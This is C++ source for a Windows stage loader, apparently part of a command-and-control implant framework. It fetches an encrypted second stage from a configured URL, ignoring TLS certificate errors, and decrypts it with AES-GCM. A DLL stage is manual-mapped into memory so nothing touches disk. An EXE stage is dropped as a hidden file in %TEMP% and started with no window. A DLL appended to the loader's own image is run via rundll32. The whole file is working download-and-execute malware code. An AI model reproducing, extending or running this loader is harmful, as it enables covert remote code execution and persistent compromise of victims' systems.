// wisp-cpp-loader: C++23 Windows x64 stage bootstrap (plan §4, P2).
//
// Same delivery contract as the pure-C loader: the artifact carries only the
// patched WISPCFG sentinel; at run time it fetches the one-time stage2 blob,
// decrypts AES-256-GCM, then either manual-maps a DLL (Rust agent, nothing
// touches disk) or drops an EXE in %TEMP% and spawns it hidden (Go agent).
//
// This build is the full-featured reference implementation for the shared
// pe_map.hpp mapper (std::expected/std::span, delay imports, CFG checks); the
// sRDI bootstrap compiles the same header without a CRT.
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <array>
#include <cstddef>
#include <cstdint>
#include <expected>
#include <optional>
#include <span>

#include "pe_map.hpp"

namespace {

constexpr std::size_t cfg_size = 4096;
constexpr std::size_t tag_size = 16;
constexpr std::size_t max_stage = std::size_t{64} << 20;
constexpr std::size_t emb_footer = 24;
constexpr char emb_magic[8] = {'W', 'I', 'S', 'P', 'E', 'M', 'B', 1};

extern "C" {
__attribute__((used, section(".wispcfg")))
volatile unsigned char wisp_cfg[cfg_size] = {'W', 'I', 'S', 'P', 'C', 'F', 'G', 1, 0, 0};

// The compiler may lower struct zeroing and span copies to these even with
// -fno-builtin; -nostdlib means we have to provide them.
void* memset(void* dst, int c, std::size_t n) {
    auto* d = static_cast<unsigned char*>(dst);
    while (n--) *d++ = static_cast<unsigned char>(c);
    return dst;
}

void* memcpy(void* dst, const void* src, std::size_t n) {
    auto* d = static_cast<unsigned char*>(dst);
    const auto* s = static_cast<const unsigned char*>(src);
    while (n--) *d++ = *s++;
    return dst;
}
}

enum class fail {
    no_config,
    bad_config,
    bad_url,
    fetch,
    json,
    b64,
    token,
    crypto,
    decrypt,
    map,
    spawn,
    cfg_policy,
};

HANDLE g_log = INVALID_HANDLE_VALUE;

void dbg(const char* s) {
    if (g_log == INVALID_HANDLE_VALUE) return;
    DWORD n = 0;
    while (s[n]) ++n;
    DWORD written = 0;
    WriteFile(g_log, s, n, &written, nullptr);
}

std::size_t c_len(const char* s) {
    std::size_t n = 0;
    while (s[n]) ++n;
    return n;
}

void log_init() {
    wchar_t path[MAX_PATH];
    char v[4];
    if (!GetEnvironmentVariableA("WISP_CPP_DEBUG", v, sizeof v)) return;
    DWORD n = GetTempPathW(MAX_PATH, path);
    if (!n || n >= MAX_PATH - 24) return;
    const wchar_t* name = L"wisp-cpp-loader.log";
    DWORD i = 0;
    while (name[i] && n + i + 1 < MAX_PATH) {
        path[n + i] = name[i];
        ++i;
    }
    path[n + i] = 0;
    g_log = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
}

struct heap_block {
    std::uint8_t* data = nullptr;
    std::size_t size = 0;

    heap_block() = default;
    heap_block(const heap_block&) = delete;
    heap_block& operator=(const heap_block&) = delete;
    heap_block(heap_block&& o) noexcept : data(o.data), size(o.size) {
        o.data = nullptr;
        o.size = 0;
    }
    heap_block& operator=(heap_block&& o) noexcept {
        if (this != &o) {
            reset();
            data = o.data;
            size = o.size;
            o.data = nullptr;
            o.size = 0;
        }
        return *this;
    }
    ~heap_block() { reset(); }
    void reset() {
        if (data) HeapFree(GetProcessHeap(), 0, data);
        data = nullptr;
        size = 0;
    }
};

struct handle_owner {
    HANDLE h = INVALID_HANDLE_VALUE;
    handle_owner() = default;
    handle_owner(const handle_owner&) = delete;
    handle_owner& operator=(const handle_owner&) = delete;
    ~handle_owner() {
        if (h != INVALID_HANDLE_VALUE && h) CloseHandle(h);
    }
};

struct internet_owner {
    HINTERNET h = nullptr;
    internet_owner() = default;
    internet_owner(const internet_owner&) = delete;
    internet_owner& operator=(const internet_owner&) = delete;
    ~internet_owner() {
        if (h) WinHttpCloseHandle(h);
    }
};

bool find_bytes(std::span<const std::uint8_t> hay, const char* needle, std::size_t nn, std::size_t& at) {
    if (!nn || nn > hay.size()) return false;
    for (std::size_t i = 0; i + nn <= hay.size(); ++i) {
        std::size_t j = 0;
        while (j < nn && hay[i + j] == static_cast<std::uint8_t>(needle[j])) ++j;
        if (j == nn) {
            at = i;
            return true;
        }
    }
    return false;
}

// Quotes are part of the searched key so base64 bodies cannot false-match.
std::optional<std::span<const char>> json_span(std::span<const std::uint8_t> json, const char* key) {
    const std::size_t kn = c_len(key);
    std::size_t i = 0;
    while (i + kn < json.size()) {
        std::size_t off = 0;
        if (!find_bytes(json.subspan(i), key, kn, off)) return std::nullopt;
        i += off;
        std::size_t j = i + kn;
        while (j < json.size() && (json[j] == ' ' || json[j] == '\t')) ++j;
        if (j < json.size() && json[j] == ':') {
            ++j;
            while (j < json.size() && (json[j] == ' ' || json[j] == '\t')) ++j;
            if (j < json.size() && json[j] == '"') {
                ++j;
                const std::size_t start = j;
                while (j < json.size() && json[j] != '"') ++j;
                if (j >= json.size()) return std::nullopt;
                return std::span<const char>(reinterpret_cast<const char*>(json.data() + start), j - start);
            }
        }
        i += kn;
    }
    return std::nullopt;
}

std::optional<std::span<const char>> config_staged(heap_block& out) {
    const volatile unsigned char* p = wisp_cfg;
    if (p[0] != 'W' || p[1] != 'I' || p[2] != 'S' || p[3] != 'P' ||
        p[4] != 'C' || p[5] != 'F' || p[6] != 'G' || p[7] != 1)
        return std::nullopt;
    const std::size_t n = static_cast<std::size_t>(p[8]) | (static_cast<std::size_t>(p[9]) << 8);
    if (!n || n > cfg_size - 10) return std::nullopt;
    out.data = static_cast<std::uint8_t*>(HeapAlloc(GetProcessHeap(), 0, n));
    if (!out.data) return std::nullopt;
    out.size = n;
    for (std::size_t i = 0; i < n; ++i) out.data[i] = p[10 + i];
    auto v = json_span({out.data, out.size}, "\"staged\"");
    if (!v || v->empty() || v->size() >= 512) return std::nullopt;
    return v;
}

std::optional<std::span<const char>> token_from_url(std::span<const char> url) {
    std::size_t slash = std::size_t(-1);
    for (std::size_t i = 0; i < url.size(); ++i)
        if (url[i] == '/') slash = i;
    if (slash == std::size_t(-1) || slash + 1 >= url.size()) return std::nullopt;
    std::size_t n = 0;
    while (slash + 1 + n < url.size() && url[slash + 1 + n] != '?' && url[slash + 1 + n] != '#' && n < 159)
        ++n;
    if (!n) return std::nullopt;
    return url.subspan(slash + 1, n);
}

bool to_wide(std::span<const char> src, wchar_t* dst, int cap) {
    return MultiByteToWideChar(CP_UTF8, 0, src.data(), static_cast<int>(src.size()), dst, cap) > 0;
}

std::expected<heap_block, fail> fetch_stage(std::span<const char> url) {
    wchar_t wurl[512];
    if (url.size() + 1 >= std::size(wurl) || !to_wide(url, wurl, static_cast<int>(std::size(wurl))) ||
        !wurl[0])
        return std::unexpected(fail::bad_url);
    wurl[url.size()] = 0;

    wchar_t host[128];
    wchar_t path[768];
    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof uc;
    uc.lpszHostName = host;
    uc.dwHostNameLength = static_cast<DWORD>(std::size(host));
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = static_cast<DWORD>(std::size(path));
    if (!WinHttpCrackUrl(wurl, 0, 0, &uc) || uc.dwHostNameLength == 0 ||
        uc.dwHostNameLength >= std::size(host) || uc.dwUrlPathLength == 0 ||
        uc.dwUrlPathLength >= std::size(path))
        return std::unexpected(fail::bad_url);
    host[uc.dwHostNameLength] = 0;
    path[uc.dwUrlPathLength] = 0;

    internet_owner ses, con, req;
    ses.h = WinHttpOpen(L"wisp-cpp-loader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ses.h) return std::unexpected(fail::fetch);
    con.h = WinHttpConnect(ses.h, host, uc.nPort, 0);
    if (!con.h) return std::unexpected(fail::fetch);
    const DWORD flags = uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0;
    req.h = WinHttpOpenRequest(con.h, L"GET", path, nullptr, WINHTTP_NO_REFERER,
                               WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!req.h) return std::unexpected(fail::fetch);
    if (flags) {
        DWORD sec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(req.h, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof sec);
    }
    if (!WinHttpSendRequest(req.h, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(req.h, nullptr))
        return std::unexpected(fail::fetch);

    DWORD status = 0, status_len = sizeof status;
    if (!WinHttpQueryHeaders(req.h, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_len, WINHTTP_NO_HEADER_INDEX) ||
        status != HTTP_STATUS_OK)
        return std::unexpected(fail::fetch);

    heap_block out;
    out.data = static_cast<std::uint8_t*>(HeapAlloc(GetProcessHeap(), 0, 1));
    if (!out.data) return std::unexpected(fail::fetch);
    std::size_t total = 0;
    for (;;) {
        DWORD avail = 0, got = 0;
        if (!WinHttpQueryDataAvailable(req.h, &avail) || !avail) break;
        if (total + avail > max_stage) break;
        auto* next = static_cast<std::uint8_t*>(HeapReAlloc(GetProcessHeap(), 0, out.data, total + avail));
        if (!next) return std::unexpected(fail::fetch);
        out.data = next;
        if (!WinHttpReadData(req.h, out.data + total, avail, &got) || !got) break;
        total += got;
    }
    if (!total) return std::unexpected(fail::fetch);
    out.size = total;
    return out;
}

int b64_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

std::expected<heap_block, fail> b64_decode(std::span<const char> src) {
    heap_block out;
    out.data = static_cast<std::uint8_t*>(HeapAlloc(GetProcessHeap(), 0, src.size() / 4 * 3 + 3));
    if (!out.data) return std::unexpected(fail::b64);
    std::size_t k = 0;
    int val = 0, bits = -8;
    for (char c : src) {
        if (c == '=') break;
        const int v = b64_value(c);
        if (v < 0) return std::unexpected(fail::b64);
        val = (val << 6) | v;
        bits += 6;
        if (bits >= 0) {
            out.data[k++] = static_cast<std::uint8_t>((val >> bits) & 0xff);
            bits -= 8;
        }
    }
    out.size = k;
    return out;
}

std::expected<std::array<std::uint8_t, 32>, fail> sha256(std::span<const std::uint8_t> data) {
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    std::array<std::uint8_t, 32> out{};
    bool ok = false;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
        return std::unexpected(fail::crypto);
    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &hash, nullptr, 0, nullptr, 0, 0))) goto done;
    if (!BCRYPT_SUCCESS(BCryptHashData(hash, const_cast<PUCHAR>(data.data()),
                                       static_cast<ULONG>(data.size()), 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptFinishHash(hash, out.data(), static_cast<ULONG>(out.size()), 0))) goto done;
    ok = true;
done:
    if (hash) BCryptDestroyHash(hash);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    if (!ok) return std::unexpected(fail::crypto);
    return out;
}

std::expected<heap_block, fail> gcm_open(std::span<const std::uint8_t> key, std::span<const std::uint8_t> iv,
                                         std::span<const std::uint8_t> ct) {
    if (ct.size() <= tag_size) return std::unexpected(fail::decrypt);
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_KEY_HANDLE keyh = nullptr;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    heap_block out;
    DWORD got = 0;
    bool ok = false;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
        return std::unexpected(fail::crypto);
    if (!BCRYPT_SUCCESS(BCryptSetProperty(
            alg, BCRYPT_CHAINING_MODE,
            const_cast<PUCHAR>(reinterpret_cast<const UCHAR*>(BCRYPT_CHAIN_MODE_GCM)),
            sizeof(BCRYPT_CHAIN_MODE_GCM), 0)))
        goto done;
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(alg, &keyh, nullptr, 0,
                                                   const_cast<PUCHAR>(key.data()),
                                                   static_cast<ULONG>(key.size()), 0)))
        goto done;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = const_cast<PUCHAR>(iv.data());
    info.cbNonce = static_cast<ULONG>(iv.size());
    info.pbTag = const_cast<PUCHAR>(ct.data() + ct.size() - tag_size);
    info.cbTag = tag_size;
    out.data = static_cast<std::uint8_t*>(HeapAlloc(GetProcessHeap(), 0, ct.size()));
    if (!out.data) goto done;
    if (!BCRYPT_SUCCESS(BCryptDecrypt(keyh, const_cast<PUCHAR>(ct.data()),
                                      static_cast<ULONG>(ct.size() - tag_size), &info, nullptr, 0,
                                      out.data, static_cast<ULONG>(ct.size()), &got, 0)))
        goto done;
    out.size = got;
    ok = true;
done:
    if (keyh) BCryptDestroyKey(keyh);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    if (!ok) return std::unexpected(fail::decrypt);
    return out;
}

bool process_cfg_enabled() {
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY p{};
    if (!GetProcessMitigationPolicy(GetCurrentProcess(), ProcessControlFlowGuardPolicy, &p, sizeof p))
        return false;
    return p.EnableControlFlowGuard != 0;
}

bool dynamic_code_prohibited() {
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY p{};
    if (!GetProcessMitigationPolicy(GetCurrentProcess(), ProcessDynamicCodePolicy, &p, sizeof p))
        return false;
    return p.ProhibitDynamicCode != 0;
}

bool register_call_target(void* addr) {
    using valid_fn = BOOL(WINAPI*)(HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO);
    static valid_fn valid = nullptr; // resolved below without a guard
    if (!valid) {
        // Not in every MinGW import library; the OS export is stable since Win10.
        valid = reinterpret_cast<valid_fn>(
            GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetProcessValidCallTargets"));
        if (!valid) return false;
    }
    MEMORY_BASIC_INFORMATION mbi{};
    if (!VirtualQuery(addr, &mbi, sizeof mbi)) return false;
    CFG_CALL_TARGET_INFO info{};
    info.Offset = static_cast<ULONG_PTR>(reinterpret_cast<std::uintptr_t>(addr)) -
                  static_cast<ULONG_PTR>(reinterpret_cast<std::uintptr_t>(mbi.BaseAddress));
    info.Flags = CFG_CALL_TARGET_VALID;
    return valid(GetCurrentProcess(), mbi.BaseAddress, mbi.RegionSize, 1, &info);
}

wisp::pe::api pe_api() {
    return wisp::pe::api{
        [](std::uint64_t preferred, std::size_t size) -> void* {
            void* p = VirtualAlloc(reinterpret_cast<void*>(static_cast<std::uintptr_t>(preferred)), size,
                                   MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (!p) p = VirtualAlloc(nullptr, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            return p;
        },
        [](void* base) { return VirtualFree(base, 0, MEM_RELEASE) != 0; },
        [](void* addr, std::size_t size, std::uint32_t prot, std::uint32_t* old) {
            return VirtualProtect(addr, size, prot, reinterpret_cast<DWORD*>(old)) != 0;
        },
        [](const char* name) -> void* { return LoadLibraryA(name); },
        [](void* mod, const char* name) -> void* {
            return reinterpret_cast<void*>(GetProcAddress(static_cast<HMODULE>(mod), name));
        },
        [](const void* table, std::uint32_t count, std::uint64_t base) {
            using add_fn = BOOLEAN(WINAPI*)(PRUNTIME_FUNCTION, DWORD, DWORD64);
            auto add = reinterpret_cast<add_fn>(
                GetProcAddress(GetModuleHandleA("kernel32.dll"), "RtlAddFunctionTable"));
            return add && add(reinterpret_cast<PRUNTIME_FUNCTION>(const_cast<void*>(table)), count, base);
        },
        []() { return process_cfg_enabled(); },
        [](void* addr) { return register_call_target(addr); },
    };
}

// delivery=subprocess artifacts carry a config-patched DLL plus a 24-byte
// footer appended to this same loader image; staged artifacts have no footer.
std::optional<heap_block> read_embedded() {
    wchar_t path[MAX_PATH];
    const DWORD n = GetModuleFileNameW(nullptr, path, MAX_PATH);
    if (!n || n >= MAX_PATH) return std::nullopt;
    handle_owner file;
    file.h = CreateFileW(path, GENERIC_READ,
                         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file.h == INVALID_HANDLE_VALUE) return std::nullopt;

    LARGE_INTEGER size{}, at{};
    if (!GetFileSizeEx(file.h, &size) ||
        size.QuadPart < static_cast<LONGLONG>(emb_footer))
        return std::nullopt;
    at.QuadPart = size.QuadPart - static_cast<LONGLONG>(emb_footer);
    std::uint8_t foot[emb_footer];
    DWORD got = 0;
    if (!SetFilePointerEx(file.h, at, nullptr, FILE_BEGIN) ||
        !ReadFile(file.h, foot, static_cast<DWORD>(emb_footer), &got, nullptr) ||
        got != emb_footer)
        return std::nullopt;
    for (int i = 0; i < 8; ++i) {
        if (foot[16 + i] != static_cast<std::uint8_t>(emb_magic[i])) return std::nullopt;
    }
    const std::uint64_t off = wisp::pe::detail::rd64(foot);
    const std::uint32_t len = wisp::pe::detail::rd32(foot + 8);
    const std::uint32_t flags = wisp::pe::detail::rd32(foot + 12);
    if (flags != 1 || !len ||
        off + len + emb_footer != static_cast<std::uint64_t>(size.QuadPart))
        return std::nullopt;

    heap_block out;
    out.data = static_cast<std::uint8_t*>(HeapAlloc(GetProcessHeap(), 0, len));
    if (!out.data) return std::nullopt;
    out.size = len;
    at.QuadPart = static_cast<LONGLONG>(off);
    if (!SetFilePointerEx(file.h, at, nullptr, FILE_BEGIN) ||
        !ReadFile(file.h, out.data, len, &got, nullptr) || got != len)
        return std::nullopt;
    return out;
}

bool write_temp_file(std::span<const std::uint8_t> image, const wchar_t* tail_fmt, wchar_t* path) {
    DWORD rnd = 0;
    BCryptGenRandom(nullptr, reinterpret_cast<PUCHAR>(&rnd), sizeof rnd, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    rnd ^= GetTickCount() ^ (GetCurrentProcessId() << 16);
    const DWORD n = GetTempPathW(MAX_PATH, path);
    if (!n || n >= MAX_PATH - 32) return false;
    wchar_t tail[32];
    const int tn = wsprintfW(tail, tail_fmt, rnd);
    if (tn <= 0 || n + static_cast<DWORD>(tn) >= MAX_PATH) return false;
    for (int i = 0; i <= tn; ++i) path[n + i] = tail[i];

    handle_owner file;
    file.h = CreateFileW(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (file.h == INVALID_HANDLE_VALUE) return false;
    std::size_t total = 0;
    while (total < image.size()) {
        DWORD wrote = 0;
        const DWORD chunk = static_cast<DWORD>(image.size() - total);
        if (!WriteFile(file.h, image.data() + total, chunk, &wrote, nullptr) || !wrote) return false;
        total += wrote;
    }
    CloseHandle(file.h);
    file.h = INVALID_HANDLE_VALUE;
    return true;
}

bool write_and_spawn(std::span<const std::uint8_t> image) {
    wchar_t path[MAX_PATH];
    if (!write_temp_file(image, L".w%08x.exe", path)) return false;
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof si;
    if (!CreateProcessW(path, nullptr, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

bool write_and_rundll32(std::span<const std::uint8_t> image) {
    wchar_t path[MAX_PATH];
    if (!write_temp_file(image, L".d%08x.dll", path)) return false;
    wchar_t cmd[MAX_PATH + 64];
    if (!wsprintfW(cmd, L"rundll32.exe \"%s\",WispStart", path)) return false;
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof si;
    if (!CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int run_mapped(heap_block& plain, bool& mapped_ok) {
    auto img = wisp::pe::map_image({plain.data, plain.size}, pe_api());
    if (!img) {
        mapped_ok = false;
        dbg("cpp: map failed\n");
        return 12;
    }
    auto rc = wisp::pe::run_export(*img, pe_api(), "WispStartEx", "WispStart", nullptr, true);
    mapped_ok = true;
    if (!rc) {
        dbg("cpp: export missing\n");
        return 13;
    }
    dbg("cpp: agent returned\n");
    return *rc ? 14 : 0;
}

__attribute__((noreturn)) void exit_with(int code) { ExitProcess(static_cast<UINT>(code)); }

} // namespace

extern "C" __attribute__((noreturn)) void loader_entry() {
    log_init();
    dbg("cpp: start\n");

    auto embedded = read_embedded();
    if (embedded) {
        dbg("cpp: embedded dll\n");
        if (!write_and_rundll32({embedded->data, embedded->size})) {
            dbg("cpp: embedded write/rundll32 failed\n");
            exit_with(20);
        }
        dbg("cpp: spawned rundll32\n");
        exit_with(0);
    }

    if (dynamic_code_prohibited()) {
        dbg("cpp: dynamic code prohibited\n");
        exit_with(15);
    }

    heap_block cfg;
    auto url = config_staged(cfg);
    if (!url) {
        dbg("cpp: no staged config\n");
        exit_with(2);
    }
    dbg("cpp: cfg ok\n");

    auto token = token_from_url(*url);
    if (!token) {
        dbg("cpp: token failed\n");
        exit_with(7);
    }

    auto resp = fetch_stage(*url);
    if (!resp) {
        dbg("cpp: fetch failed\n");
        exit_with(4);
    }
    dbg("cpp: fetched\n");

    auto ivb = json_span({resp->data, resp->size}, "\"iv\"");
    auto ctb = json_span({resp->data, resp->size}, "\"ct\"");
    if (!ivb || !ctb) {
        dbg("cpp: json span failed\n");
        exit_with(5);
    }
    auto iv = b64_decode(*ivb);
    auto ct = b64_decode(*ctb);
    if (!iv || !ct || !iv->size || ct->size <= tag_size) {
        dbg("cpp: b64 failed\n");
        exit_with(6);
    }
    dbg("cpp: b64 ok\n");

    constexpr char prefix[] = "sp-stage|";
    std::uint8_t material[sizeof(prefix) - 1 + 160];
    __builtin_memcpy(material, prefix, sizeof(prefix) - 1);
    if (token->size() >= 160) {
        dbg("cpp: token too long\n");
        exit_with(8);
    }
    __builtin_memcpy(material + sizeof(prefix) - 1, token->data(), token->size());
    auto key = sha256({material, sizeof(prefix) - 1 + token->size()});
    if (!key) {
        dbg("cpp: sha256 failed\n");
        exit_with(9);
    }

    auto plain = gcm_open(*key, {iv->data, iv->size}, {ct->data, ct->size});
    if (!plain || !plain->size) {
        dbg("cpp: decrypt failed\n");
        exit_with(10);
    }
    dbg("cpp: decrypted\n");

    if (wisp::pe::is_dll({plain->data, plain->size})) {
        dbg("cpp: dll stage2\n");
        bool mapped = false;
        const int code = run_mapped(*plain, mapped);
        if (!mapped) exit_with(12);
        exit_with(code);
    }

    dbg("cpp: exe stage2\n");
    if (!write_and_spawn({plain->data, plain->size})) {
        dbg("cpp: spawn failed\n");
        exit_with(11);
    }
    dbg("cpp: spawned\n");
    exit_with(0);
}
